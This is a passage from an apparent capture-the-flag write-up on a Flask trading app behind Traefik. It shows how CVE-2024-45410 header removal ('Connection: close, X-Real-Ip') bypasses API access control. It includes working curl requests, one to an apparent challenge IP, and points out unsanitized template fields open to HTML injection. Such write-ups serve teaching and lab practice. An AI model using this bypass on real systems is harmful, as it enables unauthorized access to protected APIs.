</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Proto: http
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Server: a477f169e095                       
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Real-Ip: 127.0.0.1
</span></span></span></code></pre></div><p>Notice that since <code>traefik</code> is now sitting in front of Flask, it appends a couple of <code>X-*</code> headers to tell Flask what the original IP of the request was.</p>
<p>A request sent to Flask internally, say using <code>curl</code> for example and not through <code>traefik</code>, does not include these <code>X-*</code> headers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Received headers:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: curl/8.12.1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept: */*
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-For: 127.0.0.1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Port: 1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Proto: http
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Server: a477f169e095                       
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Real-Ip: 127.0.0.1
</span></span></span></code></pre></div><p>In our <code>token_required</code> middleware there is an implicit assumption that says:</p>
<ul>
<li><strong>Every</strong> request sent through <code>traefik</code> will have the <code>X-Real-Ip</code> header</li>
<li>If a request does not have the <code>X-Real-Ip</code> header, it is to be trusted as it must be a local request.</li>
</ul>
<p>I asked, what if that is not true?</p>
<p>Remember that we noticed that <code>traefik</code> v2.10.4 was used? Now that we understand the role of <code>traefik</code>, we ask ourselves, why?</p>
<p>A bunch of searches online and we find a bunch of 2025 CVEs that were fixed on v2.11.24 succeeding v2.10.4:
<img src="/posts/novacore-a-never-ending-chain/traefik_github_cves.png"></p>
<p>We do not really find anything interesting in them. More searching and we find <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45410">CVE-2024-45410</a> which reads:</p>
<blockquote>
<p>When a HTTP request is processed by Traefik, certain HTTP headers such as X-Forwarded-Host or X-Forwarded-Port are added by Traefik before the request is routed to the application.</p>
</blockquote>
<p>Oh, yes! What else?</p>
<blockquote>
<p>For a HTTP client, it should not be possible to remove or modify these headers. Since the application trusts the value of these headers, security implications might arise, if they can be modified.</p>
</blockquote>
<p>Most certainly! What else??</p>
<blockquote>
<p>For HTTP/1.1, however, it was found that some of theses custom headers can indeed be removed and in certain cases manipulated. The attack relies on the HTTP/1.1 behavior, that headers can be defined as hop-by-hop via the HTTP Connection header. This issue has been addressed in release versions 2.11.9 and 3.1.3.</p>
</blockquote>
<p>We also find the corresponding <a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">GitHub advisory</a> which confirms this ability:
<img src="/posts/novacore-a-never-ending-chain/traefik_github_advisory.png"></p>
<p>The advisory details that:</p>
<blockquote>
<p>It was found that the following headers can be removed in this way (i.e. by specifing them within a connection header):</p>
</blockquote>
<ul>
<li>X-Forwarded-Host</li>
<li>X-Forwarded-Port</li>
<li>X-Forwarded-Proto</li>
<li>X-Forwarded-Server</li>
<li>X-Real-Ip</li>
<li>X-Forwarded-Tls-Client-Cert</li>
<li>X-Forwarded-Tls-Client-Cert-Info</li>
</ul>
<p>We send a request to demonstrate the vulnerability:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:1337/ -H <span style="color:#e6db74">&#34;Connection: close, X-Real-Ip&#34;</span>
</span></span></code></pre></div><p>And we notice that we do on the other end, <code>X-Real-Ip</code> got dropped:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Received Headers:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent: curl/8.12.1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Accept: */*
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-For: 127.0.0.1
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Host: 127.0.0.1:1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Port: 1337
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Proto: http
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">X-Forwarded-Server: a477f169e095                       
</span></span></span></code></pre></div><p>Brilliant! A follow up request confirms that we have, indeed, bypassed the API access control:</p>
<pre tabindex="0"><code> curl http://94.237.122.124:47098/api/trades -H &#34;Connection: close, X-Real-Ip&#34;
{&#34;trades&#34;:[]}
</code></pre><h2 id="chapter-4-wreaking-havoc">Chapter 4: Wreaking Havoc<a href="#chapter-4-wreaking-havoc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>In the last chapter, we successfully analyzed the two primary protection mechanisms in both <code>web.py</code> and <code>app.py</code> (<code>/</code> and <code>/api</code> routers respectively)</p>
<p>In <code>web.py</code>, we couldn&rsquo;t bypass the <code>login_required()</code> middleware, but we found a same-site read-write primitive at <code>/front_end_error/&lt;action&gt;/&lt;log_level&gt;</code>. On the other hand, on <code>api.py</code> we identified <strong>CVE-2024-45410</strong> in the used Traefik version which allowed us to bypass the API&rsquo;s access control completely.</p>
<p>Let&rsquo;s see what we can do with our newly found powers.</p>
<p>As seen earlier, the API has features related to managing trades:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td><code>/active_signals</code></td>
<td>Get active signals</td>
</tr>
<tr>
<td>POST</td>
<td><code>/copy_signal_trade</code></td>
<td>Copy a signal to a trade</td>
</tr>
<tr>
<td>GET</td>
<td><code>/trades</code></td>
<td>Get user trades</td>
</tr>
<tr>
<td>POST</td>
<td><code>/edit_trade</code></td>
<td>Edit a user&rsquo;s trade</td>
</tr>
</tbody>
</table>
<p>Interesting. Remember that the bot account is periodically checking his trades? Maybe we can serve him some malicious trades!</p>
<p>Before we do that, let&rsquo;s check out how data flows to the <code>/my_trades</code> page which the bot lands on.</p>
<ol>
<li><code>my_trades</code> is defined in the <code>my_trades.html</code> template, which displays trades as this:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">tbody</span>&gt;
</span></span><span style="display:flex;"><span>	{% for trade in trades %}
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">td</span>&gt;{{ loop.index }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">td</span>&gt;{{ trade.data.action | safe }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">td</span>&gt;{{ trade.data.price | safe }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">td</span>&gt;{{ trade.data.symbol | safe }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">td</span>&gt;{{ trade.key }}&lt;/<span style="color:#f92672">td</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">tr</span>&gt;
</span></span><span style="display:flex;"><span>	{% endfor %}
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">tbody</span>&gt;
</span></span></code></pre></div><p>Needless to say, the three properties, <code>action</code>, <code>price</code> and <code>symbol</code> are not sanitized giving us an HTML injection vector if we can control them.</p>
<p>Let&rsquo;s see where the trades come from.</p>
<ol start="2">
<li>The request is handled by <code>/my_trades</code> in <code>web.py</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#34;/my_trades&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@login_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_trades</span>():
</span></span><span style="display:flex;"><span>	trade_data <span style="color:#f92672">=</span> fetch_cache(<span style="color:#e6db74">&#34;trades&#34;</span>, session[<span style="color:#e6db74">&#34;api_token&#34;</span>])
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> trade_data:
</span></span><span style="display:flex;"><span>		trade_data <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		trade_data <span style="color:#f92672">=</span> trade_data[<span style="color:#e6db74">&#34;trades&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;my_trades.html&#34;</span>, title<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Live Signals&#34;</span>, session_data<span style="color:#f92672">=</span>session, trades<span style="color:#f92672">=</span>trade_data)
</span></span></code></pre></div><p><code>trade_data</code> is fetched via <code>fetch_cache(&quot;trades&quot;, session[&quot;api_token&quot;])</code> before getting rendered to the user. How does <code>fetch_cache</code> work though?</p>
<ol start="3">
<li><code>fetch_cache</code> is defined in <code>general.py</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fetch_cache</span>(endpoint, token):
</span></span><span style="display:flex;"><span>	endpoint <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://127.0.0.1:1337/api/</span><span style="color:#e6db74">{</span>endpoint<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>	headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;Authorization&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(endpoint, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>		response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;error&#34;</span>: str(e)}
</span></span></code></pre></div><p>Turns out, <code>fetch_cache</code> is a wrapper that calls <code>/api/trades</code> internally via <code>requests</code>; it also sends the <code>Authorization</code> token received from the user&rsquo;s session.</p>
<p>Let&rsquo;s see where the API in turn gets these trades from.</p>
<ol start="4">
<li>The <code>/api/trades</code> API endpoint is a wrapper around the <code>AetherCacheClient</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@api.route</span>(<span style="color:#e6db74">&#34;/trades&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@token_required</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trades</span>():
</span></span><span style="display:flex;"><span>	cache_session <span style="color:#f92672">=</span> AetherCacheClient()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	user_id <span style="color:#f92672">=</span> g<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>id <span style="color:#66d9ef">if</span> g<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>) <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;sys_admin&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	trade_keys <span style="color:#f92672">=</span> cache_session<span style="color:#f92672">.</span>list_keys()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	trades <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> trade_keys:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;user:</span><span style="color:#e6db74">{</span>user_id<span style="color:#e6db74">}</span><span style="color:#e6db74">:trade:&#34;</span>):
</span></span><span style="display:flex;"><span>			value <span style="color:#f92672">=</span> cache_session<span style="color:#f92672">.</span>get(key)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> value:
</span></span><span style="display:flex;"><span>				trades<span style="color:#f92672">.</span>append({
</span></span><span style="display:flex;"><span>					<span style="color:#e6db74">&#34;key&#34;</span>: key<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],
</span></span><span style="display:flex;"><span>					<span style="color:#e6db74">&#34;data&#34;</span>: parse_signal_data(value)
</span></span><span style="display:flex;"><span>				})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;trades&#34;</span>: trades})
</span></span></code></pre></div><p>It first grabs a <code>cache_session</code> by instantiating <code>AetherCacheClient</code>, then gets all keys stored in the cache.</p>
<p>The function gets the current user&rsquo;s ID <code>user_id</code> stored on the global Flask request context <code>g</code> and falls back to <code>sys_admin</code> if it is not set.</p>
<p>The function then extracts all trade signal keys that follow the pattern <code>user:{user_id}:trade:</code> and returns each value after parsing it using <code>parse_signal_data</code>.</p>
<p>Cool. Let&rsquo;s go deeper and see how does <code>AetherCacheClient</code> work?</p>
<ol start="5">
<li><code>AetherCacheClient</code> is a Python sockets wrapper around the <code>aetherCache.c</code> program</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AetherCacheClient</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">6379</span>
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">5.0</span>
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>settimeout(self<span style="color:#f92672">.</span>timeout)
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>connect()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>(self):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>connect((self<span style="color:#f92672">.</span>host, self<span style="color:#f92672">.</span>port))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">validate_input</span>(self, text):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;^[\x20-\x7E]+$&#34;</span>, text):
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_command</span>(self, command):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>sendall(command<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>			response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ERROR: Request timed out.&#34;</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ERROR&#34;</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set</span>(self, key, value):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>validate_input(key) <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>validate_input(value):
</span></span><span style="display:flex;"><span>			command <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;set </span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>send_command(command)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ERROR: Invalid input. Command dropped.&#34;</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self, key):
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>validate_input(key):
</span></span><span style="display:flex;"><span>			command <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;get </span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>			response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>send_command(command)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> response <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;NOT_FOUND&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;ERROR&#34;</span> <span style="color:#f92672">in</span> response:
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_keys</span>(self):
</span></span><span style="display:flex;"><span>		command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;list</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>send_command(command)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;ERROR&#34;</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> []
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> response<span style="color:#f92672">.</span>splitlines() <span style="color:#66d9ef">if</span> response <span style="color:#66d9ef">else</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">migrate</span>(self):
</span></span><span style="display:flex;"><span>		signals <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>			{<span style="color:#e6db74">&#34;symbol&#34;</span>: <span style="color:#e6db74">&#34;AAPL&#34;</span>, <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;buy&#34;</span>, <span style="color:#e6db74">&#34;price&#34;</span>: <span style="color:#e6db74">&#34;150.236&#34;</span>},
</span></span><span style="display:flex;"><span>			{<span style="color:#e6db74">&#34;symbol&#34;</span>: <span style="color:#e6db74">&#34;GOOGL&#34;</span>, <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;sell&#34;</span>, <span style="color:#e6db74">&#34;price&#34;</span>: <span style="color:#e6db74">&#34;2800.12&#34;</span>},
</span></span><span style="display:flex;"><span>			{<span style="color:#e6db74">&#34;symbol&#34;</span>: <span style="color:#e6db74">&#34;TSLA&#34;</span>, <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;buy&#34;</span>, <span style="color:#e6db74">&#34;price&#34;</span>: <span style="color:#e6db74">&#34;761.01&#34;</span>},
</span></span><span style="display:flex;"><span>			{<span style="color:#e6db74">&#34;symbol&#34;</span>: <span style="color:#e6db74">&#34;AMZN&#34;</span>, <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;sell&#34;</span>, <span style="color:#e6db74">&#34;price&#34;</span>: <span style="color:#e6db74">&#34;3321.10&#34;</span>},
</span></span><span style="display:flex;"><span>			{<span style="color:#e6db74">&#34;symbol&#34;</span>: <span style="color:#e6db74">&#34;NFLX&#34;</span>, <span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;buy&#34;</span>, <span style="color:#e6db74">&#34;price&#34;</span>: <span style="color:#e6db74">&#34;550.67&#34;</span>}
</span></span><span style="display:flex;"><span>		]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> signal <span style="color:#f92672">in</span> signals:
</span></span><span style="display:flex;"><span>			signal_id <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())
</span></span><span style="display:flex;"><span>			signal_data <span style="color:#f92672">=</span> format_signal_data(signal[<span style="color:#e6db74">&#34;symbol&#34;</span>], signal[<span style="color:#e6db74">&#34;action&#34;</span>], signal[<span style="color:#e6db74">&#34;price&#34;</span>])
</span></span><span style="display:flex;"><span>			self<span style="color:#f92672">.</span>set(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;signal:</span><span style="color:#e6db74">{</span>signal_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, signal_data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">close</span>(self):
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>sock<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> __del__(self):
</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>We can see it offers some convenience methods such as <code>set</code>, <code>get</code> and <code>list_keys</code>. They are all simply sending commands to the underlying key-value store. The raw commands include:</p>
<ul>
<li><code>list</code></li>
<li><code>get &lt;key&gt;</code></li>
<li><code>set &lt;key&gt; &lt;value&gt;</code></li>
</ul>
<p>It is a very simple keystore similar to Redis.</p>
<p>Let us confirm these results by logging to the Docker container locally and inspecting the cache.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@a289fda6f4bd:/# nc -v 127.0.0.1 <span style="color:#ae81ff">6379</span>
</span></span><span style="display:flex;"><span>Connection to 127.0.0.1 <span style="color:#ae81ff">6379</span> port <span style="color:#f92672">[</span>tcp/*<span style="color:#f92672">]</span> succeeded!
</span></span><span style="display:flex;"><span>list
</span></span><span style="display:flex;"><span>signal:17bb0ffc-5b96-44f3-8e86-ec104e68b5df
</span></span><span style="display:flex;"><span>signal:a6598f42-8457-46ad-bf3a-b5aa2d97d0b6
</span></span><span style="display:flex;"><span>signal:24c9fd30-9a88-421e-a65b-eabb2938d457
</span></span><span style="display:flex;"><span>signal:42d56d70-1322-4f6a-b89c-c8b49986ab6f
</span></span><span style="display:flex;"><span>signal:2e76d99f-afbc-4ef2-a06e-ef5123d13613
</span></span><span style="display:flex;"><span>get signal:24c9fd30-9a88-421e-a65b-eabb2938d457
</span></span><span style="display:flex;"><span>symbol|TSLA|action|buy|price|761.01
</span></span></code></pre></div><p>Interesting, so we have a bunch of signals, and we can read some of them. Let&rsquo;s try to copy a signal and see what happens:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://localhost:1337/api/copy_signal_trade <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-H <span style="color:#e6db74">&#34;Connection: close, X-Real-Ip&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>	-d <span style="color:#e6db74">&#39;{&#34;signal_id&#34;: &#34;24c9fd30-9a88-421e-a65b-eabb2938d457&#34;}&#39;</span>
